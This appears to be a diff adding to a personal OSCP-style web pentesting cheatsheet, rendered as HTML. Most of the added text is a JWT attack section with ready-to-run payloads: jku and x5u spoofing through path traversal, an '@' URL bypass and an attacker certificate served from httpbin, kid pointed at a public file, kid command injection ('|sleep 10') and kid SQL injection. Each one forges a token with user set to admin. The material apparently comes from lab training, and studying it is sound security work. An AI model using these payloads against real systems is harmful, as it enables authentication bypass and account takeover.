@@ -375,6 +375,9 @@ Project options > Sessions > Session Handling Rules > Add
 	#The macro will now automatically run before every request in the scope
 </code></pre></div></div>
 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># OR use: Authentication Token Obtain and Replace extension
+</code></pre></div></div>
+
 <hr>
 
 <h2 id="web-pentest">Web Pentest</h2>
@@ -1783,9 +1786,61 @@ Project options > Sessions > Session Handling Rules > Add
 <h3 id="jwt">JWT</h3>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
 
-#JWKS Spoofing
+#JWKS Spoofing ~ "jku" attribute
 <img src="./OSCP%20personal%20cheatsheet_files/jwt_jwks-spoofing.png">
 
+### But if:
+<img src="./OSCP%20personal%20cheatsheet_files/jwt-condition-1.png">
+### then: we need to fetch the JWK based on the "jku" header from the Trusted Server (i.e. the target web app allow to upload file)
+### exploit: 
+    1. Upload our JWK file (/home/kali/.jwt_tool/jwttool_custom_jwks.json) to the target host
+        (i.e. File uploaded in: http://hostname/random.json)
+    2. Modify the jku value in the JWT header to: http://hostname/.well-known/../random.json
+        (to bypass the check of jku URL: use -ju) - note: check for the same scheme
+    3. Final payload:   python3 jwt_tool.py {original_jwt} -X s -ju http://hostname/<strong>.well-known/../</strong>random.json -T
+
+
+### if no upload functionality -> finding an Open Redirect -> then -ju {open-redirect-url}
+### Header Injection to reflect the jwk in the response
+<img src="./OSCP%20personal%20cheatsheet_files/jwt-condition-2.png">
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># "x5u": "http://hostname/.well-known/jwks_with_x5c.json"
+- Context:
+    + The application checks that "x5u" starts with: http://hostname (no slash in the end)
+    + We can use @ to bypass this check: http://hostname@...
+- Exploit:
+    + Pull the jwks_with_x5c.json file from "x5u" URL
+    + Generate <b>private.pem</b> (for signing) & <b>hacker.crt</b> (cert for validating the signing key):
+        openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out hacker.crt -subj "/C=AU/State=Victoria/L=Melbourne/O=PentesterLab/CN=hacker"
+    + Replace "x5c" by our <b>hacker.crt</b>
+    + cat jwks_with_x5c.json | base64
+    + Serve the new created file (jwks_with_x5c.json) publicly:
+        http://hostname@httpbin.org/base64/{base64-output}
+    + Tampering new JWT and sign it with our key:
+        python3 jwt_tool.py {origin_JWT} -T -S rs256 -pr /private.pem
+            [replace] x5u = "http://hostname@httpbin.org/base64/{base64-output}"
+            [replace] user = "admin"
+    + Got new valid JWT
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Theory: When alg = hs256/hs384/hs512 it means HMAC-SHA signing <- using a secret key which is the response of "kid". If we can control this value, we can tamper and sign a new valid JWT.
+
+- Context1: alg = "HS256" & kid = "path/of/public/file"
+- Exploit:
+    + This alg will sign the token using a secret (the content of the kid)
+    + Try modify kid to a public file (or file we can get its content i.e. css file)
+
+    python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y -T -S hs256 -k /home/kali/Desktop/Pentest/PentesterLab/Blue/bootstrap.css
+        [replace] kid = "public/css/bootstrap.css"
+
+#CVE-2017-17405: directly inject kid = "|sleep 10" (ignore the signature)
+
+- Context2: alg = "HS256" & kid = "SQL Injection"
+- Exploit:
+    + Go to jwt.io -> inject SQLi payload to "kid"
+        "kid": "nonexist' UNION SELECT 1-- "
+    + Tamper "user": "admin"
+    + Input "1" as the secret to sign token
 </code></pre></div></div>
 
 <h3 id="multiple-request-csrf">CSRF</h3>
